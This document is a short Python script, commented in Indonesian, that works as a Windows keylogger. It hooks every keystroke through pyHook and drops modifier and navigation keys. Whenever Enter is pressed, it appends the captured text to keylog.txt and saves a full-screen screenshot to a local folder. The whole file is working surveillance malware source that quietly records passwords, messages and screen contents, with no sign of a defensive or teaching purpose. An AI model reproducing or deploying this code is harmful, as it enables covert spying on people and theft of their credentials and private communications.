import pyHook
import pythoncom
import os
from autopy import bitmap
import uuid

log = ''
filename = 'keylog'

blocked = ("Escape", "Oem_3", "Tab", "Lshift", 
"Lcontrol", "Lwin", "Escape", "Lmenu", "Rmenu", 
"Apps", "Rcontrol", "Rshift", "Oem_5", "Down", "Left", 
"Right", "Up", "Delete", "End", "Next", "Prior", "Home", 
"Insert","Capital")

def key_down(event):
    global log
    global filename

    if event.Key == 'Return':
        #buat screenshot
        if os.path.exists('ss') == False:
            os.mkdir('ss')
        img = bitmap.capture_screen()
        img.save("ss/{}.bmp".format(str(uuid.uuid4())))

        #kalo udah pencet enter
        file = open(filename + '.txt','a')
        # file = open("asdf.txt",'a')
        file.write(log)
        file.close()
        log = ''
    else:
        if event.Key in blocked:
            log += ''
        else:
            log += event.Key
    return True

hook = pyHook.HookManager()
hook.KeyDown = key_down
hook.HookKeyboard()
pythoncom.PumpMessages()